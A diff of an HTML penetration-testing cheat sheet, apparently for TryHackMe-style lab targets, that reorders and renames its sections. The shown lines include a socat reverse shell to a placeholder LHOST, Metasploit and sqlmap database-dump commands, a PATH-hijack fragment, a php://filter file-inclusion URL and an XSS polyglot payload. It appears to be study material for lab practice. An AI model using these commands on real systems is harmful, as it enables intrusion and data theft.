@@ -33,13 +33,13 @@
                     <li><a href="#basic-commands">Basic Commands</a></li>
                     <li><a href="#pivoting-protocols">Pivoting &amp; Protocols</a></li>
                     <li><a href="#common-tools">Common Tools</a></li>
-                    <li><a href="#enumeration">Enumeration &amp; Recon</a></li>
+                    <li><a href="#enumeration">Service Enumeration</a></li>
                     <li><a href="#cracking">Password Cracking</a></li>
                     <li><a href="#shells">Shells &amp; Payloads</a></li>
-                    <li><a href="#priv-esc">Privilege Escalation</a></li>
                     <li><a href="#exploitation">Exploitation</a></li>
+                    <li><a href="#priv-esc">Privilege Escalation</a></li>
                     <li><a href="#web-vulns">Web Vulnerabilities</a></li>
-                    <li><a href="#definitions">Definitions &amp; Distros</a></li>
+                    <li><a href="#miscellaneous">Miscellaneous</a></li>
                 </ul>
             </nav>
         </aside>
@@ -180,7 +180,7 @@ pdfinfo &lt;file&gt;
 
             <!-- Enumeration -->
             <section id="enumeration" class="content-section">
-                <h2>Enumeration &amp; Reconnaissance</h2>
+                <h2>Service Enumeration</h2>
                 
                 <h3>NMAP</h3>
                 <pre><code># Standard script and version scan
@@ -291,6 +291,33 @@ socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 -
 socat OPENSSL:&lt;LHOST&gt;:&lt;LPORT&gt;,verify=0 EXEC:/bin/bash</code></pre>
             </section>
 
+            <!-- Exploitation -->
+            <section id="exploitation" class="content-section">
+                <h2>Exploitation Frameworks</h2>
+                
+                <h3>Metasploit Console</h3>
+                <pre><code># Start framework
+msfconsole
+
+# Search and configure modules
+search type:exploit platform:windows
+use &lt;module-path&gt;
+show payloads
+set payload &lt;payload&gt;
+show options
+exploit -j # Run in background</code></pre>
+
+                <h3>sqlmap</h3>
+                <pre><code># Find databases
+sqlmap -u "http://target.thm/search?cat=1" --dbs
+
+# Extract tables from selected database
+sqlmap -u "http://target.thm/search?cat=1" -D &lt;db_name&gt; --tables
+
+# Dump tables contents
+sqlmap -u "http://target.thm/search?cat=1" -D &lt;db_name&gt; -T &lt;table_name&gt; --dump</code></pre>
+            </section>
+
             <!-- Privilege Escalation -->
             <section id="priv-esc" class="content-section">
                 <h2>Privilege Escalation</h2>
@@ -322,33 +349,6 @@ chmod +x cp
 export PATH=$PWD:$PATH</code></pre>
             </section>
 
-            <!-- Exploitation -->
-            <section id="exploitation" class="content-section">
-                <h2>Exploitation Frameworks</h2>
-                
-                <h3>Metasploit Console</h3>
-                <pre><code># Start framework
-msfconsole
-
-# Search and configure modules
-search type:exploit platform:windows
-use &lt;module-path&gt;
-show payloads
-set payload &lt;payload&gt;
-show options
-exploit -j # Run in background</code></pre>
-
-                <h3>sqlmap</h3>
-                <pre><code># Find databases
-sqlmap -u "http://target.thm/search?cat=1" --dbs
-
-# Extract tables from selected database
-sqlmap -u "http://target.thm/search?cat=1" -D &lt;db_name&gt; --tables
-
-# Dump tables contents
-sqlmap -u "http://target.thm/search?cat=1" -D &lt;db_name&gt; -T &lt;table_name&gt; --dump</code></pre>
-            </section>
-
             <!-- Web Vulnerabilities -->
             <section id="web-vulns" class="content-section">
                 <h2>Web Application Vulnerabilities</h2>
@@ -374,9 +374,9 @@ http://target.thm/test.php?view=php://filter/read=convert.base64-encode/resource
                 <pre><code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</code></pre>
             </section>
 
-            <!-- Definitions & Distros -->
-            <section id="definitions" class="content-section">
-                <h2>Definitions &amp; System Archetypes</h2>
+            <!-- Miscellaneous -->
+            <section id="miscellaneous" class="content-section">
+                <h2>Miscellaneous</h2>
                 
                 <h3>Common CVSS/VPR Metrics</h3>
                 <ul>
@@ -392,6 +392,9 @@ http://target.thm/test.php?view=php://filter/read=convert.base64-encode/resource
                 </ul>
             </section>
 
+            <footer class="site-footer">
+                <p>@2026 Aurel Strigac</p>
+            </footer>
         </main>
     </div>
 
